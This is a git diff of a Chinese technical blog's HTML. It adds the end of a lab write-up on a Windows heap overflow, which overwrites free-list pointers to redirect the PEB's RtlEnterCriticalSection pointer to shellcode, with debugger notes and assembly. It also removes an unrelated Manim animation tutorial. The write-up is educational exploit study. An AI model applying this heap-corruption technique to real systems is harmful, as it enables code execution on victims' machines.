+<p>ExitProcess会调用0x7FFDF020处的函数指针,但是这个指针已经被溢出成shellcode了,于是shellcode就执行了</p>
+<h4 id="调试观察"><a href="#调试观察" class="headerlink" title="调试观察"></a>调试观察</h4><p>int 3中断时,刚执行完<code>h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,200);</code></p>
+<p>eax&#x3D;0x360688,即h1句柄,h1堆的大小200&#x3D;0xC8字节,data占据了[0x360688,0x0x360750)</p>
+<p>那么尾块的首部就得在0x360750</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920211125615.png" alt="image-20220920211125615"></p>
+<p>0x758开始的八个字节是尾块的两个指向Freelist[0]的指针</p>
+<p>然后是将shellcode拷贝到h1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00401026   B9 80000000      MOV ECX,80;重复拷贝次数,0x80次</span><br><span class="line">0040102B   BE 30604000      MOV ESI,heap_PEB.00406030;shellcode作为源地址</span><br><span class="line">00401030   8BF8             MOV EDI,EAX;h1-&gt;eax-&gt;edi作为目的地址</span><br><span class="line">00401037   F3:A5            REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI];每次从ESI指向的内存上拿出一个双字拷贝到edi指向的内存上</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如此总共拷贝了0x80*4&#x3D;512字节,显然要溢出尾块了.</p>
+<p>拷贝完成后再看尾块</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920212207155.png" alt="image-20220920212207155"></p>
+<p>尾块的flink已经溢出修改为0x360688,这是shellcode的起始地址</p>
+<p>尾块的blink已经溢出修改成0x7F7D7020,这是PEB中线程同步函数指针的地址</p>
+<p>尾块首的前8字节溢出值仍然是合法的首部值,这是为了防止程序在DWORD SHOOT前寄掉,他真的,我哭死</p>
+<h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><p>shellcode有两个系统相关的数值,一个是NTDLL.DLL中RtlEnterCriticalSection这个函数的地址,这个可以使用dependency walker查</p>
+<p>另一个是shellcode将会被加载进入进程虚拟地址空间的哪里,这个可以先调试观察一次,然后修改shellcode</p>
+<p>使用内联汇编<strong>加载器</strong>加载shellcode,观察这段代码干了啥</p>
+<h5 id="修复PEB临界区控制函数"><a href="#修复PEB临界区控制函数" class="headerlink" title="修复PEB临界区控制函数"></a>修复PEB临界区控制函数</h5><p>由于shellcode执行之后,还需要调用RtlEnterCriticalSection这个函数指针,但是之前为了能够让shellcode执行,已经把这个函数指针改成了shellcode的地址,也就是说shellcode执行之后所有对RtlEnterCriticalSection函数的调用会重新执行shellcode,进行不下去了,这样弹不出窗口来,需要在shellcode起来之后,首先把RtlEnterCriticalSection的值改回去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00424B08   mov         eax,7FFDF020h	;程序PEB中线程同步函数的地址 RtlEnterCriticalSection函数指针的位置.放到eax中</span><br><span class="line">00424B0D   mov         ebx,77F82060h	;NTDLL.DLL库中RtlEnterCriticalSection的地址,放到ebx中</span><br><span class="line">00424B12   mov         dword ptr [eax],ebx;将ebx值赋值到eax指向的内存地址,也就是把NTDLL.DLL中,RtlEnterCriticalSection函数地址放到了PEB中的函数指针上</span><br></pre></td></tr></table></figure>
+
+<h5 id="三层循环解析函数地址-弹窗"><a href="#三层循环解析函数地址-弹窗" class="headerlink" title="三层循环解析函数地址,弹窗"></a>三层循环解析函数地址,弹窗</h5><p>剩下的shellcode之前已经分析过了</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/18/Bind-shell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2687,243 +3229,6 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> manimlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Main</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">       circle=Circle()</span><br><span class="line">       <span class="variable language_">self</span>.play(Write(circle))</span><br><span class="line">       bt=BraceText(</span><br><span class="line">            obj=circle,</span><br><span class="line">            text=<span class="string">&quot;直径$=10$&quot;</span>,</span><br><span class="line">            brace_direction=UP</span><br><span class="line">       )</span><br><span class="line">       <span class="variable language_">self</span>.play(Write(bt))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220909111120584.png" alt="image-20220909111120584"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/06/Manim0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
-      <meta itemprop="name" content="dustball">
-      <meta itemprop="description" content="dustland">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dustland">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/09/06/Manim0/" class="post-title-link" itemprop="url">manim helloworld</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-09-06 21:41:00 / Modified: 21:41:29" itemprop="dateCreated datePublished" datetime="2022-09-06T21:41:00+08:00">2022-09-06</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Manim-入门"><a href="#Manim-入门" class="headerlink" title="Manim 入门"></a>Manim 入门</h1><p>参考<a target="_blank" rel="noopener" href="https://docs.manim.org.cn/getting_started/quickstart.html">快速入门 - ManimGL 文档</a></p>
-<p>在manim根目录下面建立start.py文件</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">manim/</span><br><span class="line">├── manimlib/</span><br><span class="line">│   ├── animation/</span><br><span class="line">│   ├── ...</span><br><span class="line">│   ├── default_config.yml</span><br><span class="line">│   └── window.py</span><br><span class="line">├── (custom_config.yml)</span><br><span class="line">└── start.py</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="从例程开始"><a href="#从例程开始" class="headerlink" title="从例程开始"></a>从例程开始</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> manimlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SquareToCircle</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        circle = Circle()</span><br><span class="line">        circle.set_fill(RED, opacity=<span class="number">1</span>)</span><br><span class="line">        circle.set_stroke(PINK, width=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.add(circle)</span><br></pre></td></tr></table></figure>
-
-<p>执行命令</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manimgl start.py SquareToCircle</span><br></pre></td></tr></table></figure>
-
-<p>产生一个红色粉圈的圆点</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220906154543534.png" alt="image-20220906154543534"></p>
-<p>可以使用键盘鼠标移动画面</p>
-<blockquote>
-<ul>
-<li>滚动鼠标中键来上下移动画面</li>
-<li>按住键盘上 z 键的同时滚动鼠标中键来缩放画面</li>
-<li>按住键盘上 f 键的同时移动鼠标来平移画面</li>
-<li>按住键盘上 d 键的同时移动鼠标来改变三维视角</li>
-<li>按下键盘上 r 键恢复到最初的视角</li>
-</ul>
-<p>最后，你可以通过按 q 来关闭窗口并退出程序.</p>
-</blockquote>
-<p>整个代码算是定义了一个类SquareToCircle,它是Scene的子类,然后重写了父类的函数construct</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># Where all the animation happens</span></span><br><span class="line">    <span class="comment"># To be implemented in subclasses</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-
-<p>从这个函数中的注释看,应该在该函数中定义所有动画.</p>
-<p>然而貌似这只是创建了一个类,并没有实例化啊</p>
-<p>在执行命令时已经暗藏玄机了</p>
-<p>为了运行这个程序绘制动画,我们并没有使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python start.py</span><br></pre></td></tr></table></figure>
-
-<p>这个命令,如果真的这样写了什么都不会发生,因为我们就创建了一个子类但是没有实例化,相当于没有任何动作</p>
-<p>我们事实上用到的命令是</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manimgl start.py SquareToCircle</span><br></pre></td></tr></table></figure>
-
-<p>这后面跟着一个参数SquareToCircle,可以大胆的猜测,</p>
-<p>manimgl使用start.py这个文件中的SquareToCircle类创造实例去了,然后就执行了construct函数中的动作</p>
-<p>之前从来没有学过python,从manim的main模块入手,看看控制流是怎么样的</p>
-<h3 id="从命令行开始的控制流"><a href="#从命令行开始的控制流" class="headerlink" title="从命令行开始的控制流"></a>从命令行开始的控制流</h3><p>main模块</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> manimlib <span class="keyword">import</span> __version__</span><br><span class="line"><span class="keyword">import</span> manimlib.config</span><br><span class="line"><span class="keyword">import</span> manimlib.extract_scene</span><br><span class="line"><span class="keyword">import</span> manimlib.logger</span><br><span class="line"><span class="keyword">import</span> manimlib.utils.init_config</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ManimGL \033[32mv<span class="subst">&#123;__version__&#125;</span>\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">    args = manimlib.config.parse_cli()<span class="comment">#命令行语法分析</span></span><br><span class="line">    <span class="keyword">if</span> args.version <span class="keyword">and</span> args.file <span class="keyword">is</span> <span class="literal">None</span>:<span class="comment">#</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> args.log_level:</span><br><span class="line">        manimlib.logger.log.setLevel(args.log_level)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.config:</span><br><span class="line">        manimlib.utils.init_config.init_customization()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        config = manimlib.config.get_configuration(args)</span><br><span class="line">        scenes = manimlib.extract_scene.main(config)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> scene <span class="keyword">in</span> scenes:</span><br><span class="line">            scene.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<p>main函数里首先打印了manim版本信息,运行时也是这样的</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> D:\manim&gt; manimgl start.py SquareToCircle </span><br><span class="line">ManimGL v1.<span class="number">6.1</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>然后调用了manim命令行的语法分析器,将结果保存到args数组中</p>
-<blockquote>
-<p>这个语法分析器干了啥呢?</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">parse_cli</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parser = argparse.ArgumentParser()</span><br><span class="line">        module_location = parser.add_mutually_exclusive_group()</span><br><span class="line">        module_location.add_argument(</span><br><span class="line">            <span class="string">&quot;file&quot;</span>,</span><br><span class="line">            nargs=<span class="string">&quot;?&quot;</span>,</span><br><span class="line">            <span class="built_in">help</span>=<span class="string">&quot;Path to file holding the python code for the scene&quot;</span>,</span><br><span class="line">        )</span><br><span class="line">        parser.add_argument(</span><br><span class="line">            <span class="string">&quot;scene_names&quot;</span>,</span><br><span class="line">            nargs=<span class="string">&quot;*&quot;</span>,</span><br><span class="line">            <span class="built_in">help</span>=<span class="string">&quot;Name of the Scene class you want to see&quot;</span>,</span><br><span class="line">        )</span><br><span class="line">		parser.add_argument...</span><br><span class="line">        parser.add_argument(</span><br><span class="line">            <span class="string">&quot;--log-level&quot;</span>,</span><br><span class="line">            <span class="built_in">help</span>=<span class="string">&quot;Level of messages to Display, can be DEBUG / INFO / WARNING / ERROR / CRITICAL&quot;</span></span><br><span class="line">        )</span><br><span class="line">        args = parser.parse_args()</span><br><span class="line">        <span class="keyword">return</span> args</span><br></pre></td></tr></table></figure>
-
-<p>调用了python自带的参数语法分析器,然后给他添加了很多规则</p>
-<p>目标模块位置不包括在参数内,目标模块位置的键叫做”file”</p>
-<p>对于参数,添加了一些键比如”scene_names”,”–log-level”等等</p>
-<p>最后用args数组保存语法分析器的运行结果</p>
-<blockquote>
-<p>以后再写shell的时候可以借鉴python的语法分析器了</p>
-</blockquote>
-</blockquote>
-<p>因此main函数中调用args.version,args.log_level等等都是args数组中的键了</p>
-<p>如果命令行参数有表明本次执行命令是为了修改设置的(<code>if args.config</code>),</p>
-<p>则调用<code>manimlib.utils.init_config.init_customization</code>将命令行给出的各种参数保存到库中</p>
-<p>否则,即本次命令不是为了设置,那么就是为了运行动画了</p>
-<p>调用<code>manimlib.extract_scene.main</code>用scenes数组保存所有场景类的实例,</p>
-<blockquote>
-<p>这个函数干了啥呢?</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">config</span>):</span><br><span class="line">    module = config[<span class="string">&quot;module&quot;</span>]</span><br><span class="line">    scene_config = get_scene_config(config)</span><br><span class="line">    <span class="keyword">if</span> module <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># If no module was passed in, just play the blank scene</span></span><br><span class="line">        <span class="keyword">return</span> [BlankScene(**scene_config)]</span><br><span class="line"></span><br><span class="line">    all_scene_classes = get_scene_classes_from_module(module)</span><br><span class="line">    scenes = get_scenes_to_render(all_scene_classes, scene_config, config)</span><br><span class="line">    <span class="keyword">return</span> scenes</span><br></pre></td></tr></table></figure>
-
-<p>config来自库中的设置,也可以命令行上修改</p>
-<p>module获取命令行指定的模块名</p>
-<p>scene_config获取场景设置</p>
-<p>如果命令行上没有传递目标模块,则执行默认的黑色场景</p>
-<p>all_scene_classes从目标模块module中获取所有的scene子类</p>
-<blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_scene_classes_from_module</span>(<span class="params">module</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(module, <span class="string">&quot;SCENES_IN_ORDER&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> module.SCENES_IN_ORDER</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            member[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">for</span> member <span class="keyword">in</span> inspect.getmembers(</span><br><span class="line">                module,</span><br><span class="line">                <span class="keyword">lambda</span> x: is_child_scene(x, module)<span class="comment">#判断是否是scene的子类</span></span><br><span class="line">            )</span><br><span class="line">        ]</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>然后get_scenes_to_render将每个scene子类实例化,并返回对象数组</p>
-</blockquote>
-<p>然后遍历scenes数组,逐一运行每一个场景实例</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> scene <span class="keyword">in</span> scenes:</span><br><span class="line">     scene.run()</span><br></pre></td></tr></table></figure>
-
-<p>调用的是每个对象的run函数</p>
-<p>run函数干了啥呢?它进行了一些设置,比如设置动画开始运行的时间,</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run()-&gt;</span><br><span class="line">	construct()#执行construct中定义的动画</span><br><span class="line">	interact()#允许交互</span><br></pre></td></tr></table></figure>
-
-<p>终于就调用到我们自己写的construct函数了</p>
-<p>总结:</p>
-<p>主模块干了这么几件事:</p>
-<p>1.语法分析,分割命令行</p>
-<p>2.获取目标模块中的所有scene的子类,并给每个该种类创建实例</p>
-<p>3.遍历执行每个该种类的run函数,run会首先调用construct绘制动画,然后调用interact,允许用户和动画调用</p>
-<p>这大概就是控制流的方向</p>
-<h3 id="自定义construct"><a href="#自定义construct" class="headerlink" title="自定义construct"></a>自定义construct</h3><p>粗略地看完控制流,回到start.py中,看看construct是怎么写的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">    circle = Circle()</span><br><span class="line">    circle.set_fill(RED, opacity=<span class="number">1</span>)</span><br><span class="line">    circle.set_stroke(PINK, width=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">self</span>.add(circle)</span><br></pre></td></tr></table></figure>
-
-<p>创建了一个Circle类的实例,然后调用两个setter函数设置了图形的填充颜色,边线颜色,</p>
-<p>然后把该实例添加到SquareToCircle实例的mobjects数组中,该数组用来存放需要被动画演示的对象</p>
-<p>可以大胆推测,当SquareToCircle实例创建之后会遍历mobjects数组演示这些对象</p>
-<p>那么Circle类是怎么定义的呢?</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Circle</span>(<span class="title class_ inherited__">Arc</span>):</span><br><span class="line">    CONFIG = &#123;</span><br><span class="line">        <span class="string">&quot;color&quot;</span>: RED,</span><br><span class="line">        <span class="string">&quot;close_new_points&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;anchors_span_full_range&quot;</span>: <span class="literal">False</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, start_angle: <span class="built_in">float</span> = <span class="number">0</span>, **kwargs</span>):</span><br><span class="line">        Arc.__init__(<span class="variable language_">self</span>, start_angle, TAU, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">surround</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        mobject: Mobject,</span></span><br><span class="line"><span class="params">        dim_to_match: <span class="built_in">int</span> = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">        stretch: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">        buff: <span class="built_in">float</span> = MED_SMALL_BUFF</span></span><br><span class="line"><span class="params">    </span>):</span><br><span class="line">        <span class="comment"># Ignores dim_to_match and stretch; result will always be a circle</span></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> Perhaps create an ellipse class to handle singele-dimension stretching</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.replace(mobject, dim_to_match, stretch)</span><br><span class="line">        <span class="variable language_">self</span>.stretch((<span class="variable language_">self</span>.get_width() + <span class="number">2</span> * buff) / <span class="variable language_">self</span>.get_width(), <span class="number">0</span>)</span><br><span class="line">        <span class="variable language_">self</span>.stretch((<span class="variable language_">self</span>.get_height() + <span class="number">2</span> * buff) / <span class="variable language_">self</span>.get_height(), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">point_at_angle</span>(<span class="params">self, angle: <span class="built_in">float</span></span>) -&gt; np.ndarray:</span><br><span class="line">        start_angle = <span class="variable language_">self</span>.get_start_angle()</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.point_from_proportion(</span><br><span class="line">            (angle - start_angle) / TAU</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_radius</span>(<span class="params">self</span>) -&gt; <span class="built_in">float</span>:</span><br><span class="line">        <span class="keyword">return</span> get_norm(<span class="variable language_">self</span>.get_start() - <span class="variable language_">self</span>.get_center())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这个Circle类已经经过了层层继承,算是曾曾曾…孙子类了</p>
-<p>object</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">classDiagram </span><br><span class="line">class object &#123;</span><br><span class="line">	python中的万类之源</span><br><span class="line">&#125;</span><br><span class="line">class Mobject&#123;</span><br><span class="line">	manim中形状的父类</span><br><span class="line">&#125;</span><br><span class="line">class VMobject&#123;</span><br><span class="line">	矢量图形的父类</span><br><span class="line">&#125;</span><br><span class="line">class TipableVMobject&#123;</span><br><span class="line">	可以带箭头的矢量图的父类</span><br><span class="line">&#125;</span><br><span class="line">class Arc&#123;</span><br><span class="line">	圆弧图形的父类</span><br><span class="line">&#125;</span><br><span class="line">class Circle&#123;</span><br><span class="line">	圆圈类</span><br><span class="line">&#125;</span><br><span class="line">object &lt;|-- Mobject</span><br><span class="line">Mobject  &lt;|--  VMobject</span><br><span class="line">  VMobject  &lt;|--  TipableVMobject</span><br><span class="line"> TipableVMobject   &lt;|--  Arc</span><br><span class="line"> Arc     &lt;|--  Circle</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="添加动画"><a href="#添加动画" class="headerlink" title="添加动画"></a>添加动画</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> manimlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SquareToCircle</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        circle = Circle()</span><br><span class="line">        circle.set_fill(BLUE, opacity=<span class="number">0.5</span>)</span><br><span class="line">        circle.set_stroke(BLUE_E, width=<span class="number">4</span>)</span><br><span class="line">        square = Square()</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.play(ShowCreation(square))</span><br><span class="line">        <span class="variable language_">self</span>.wait()</span><br><span class="line">        <span class="variable language_">self</span>.play(ReplacementTransform(square, circle))</span><br><span class="line">        <span class="variable language_">self</span>.wait()</span><br></pre></td></tr></table></figure>
-
-
-
-<p><video src="https://fastly.jsdelivr.net/gh/manim-kindergarten/CDN@master/manimgl_assets/quickstart/SquareToCircle.mp4">docs.manim.org.cn&#x2F;getting_started&#x2F;quickstart.html</video></p>
-<p>相比于上一次,增加了一个展示创建矩形和矩形变圆圈的动画</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">square = Square()</span><br><span class="line"></span><br><span class="line"><span class="variable language_">self</span>.play(ShowCreation(square))<span class="comment">#展示创建一个矩形的过程</span></span><br><span class="line"><span class="variable language_">self</span>.wait()<span class="comment">#默认停顿DEFAULT_WAIT_TIME 秒</span></span><br><span class="line"><span class="variable language_">self</span>.play(ReplacementTransform(square, circle))<span class="comment">#展示矩形转换为原型的过程</span></span><br><span class="line"><span class="variable language_">self</span>.wait()</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="启用交互"><a href="#启用交互" class="headerlink" title="启用交互"></a>启用交互</h3><p>在最后加上一句</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">self</span>.embed()</span><br></pre></td></tr></table></figure>
-
-<p>当该函数执行之后,iPython终端会变成</p>
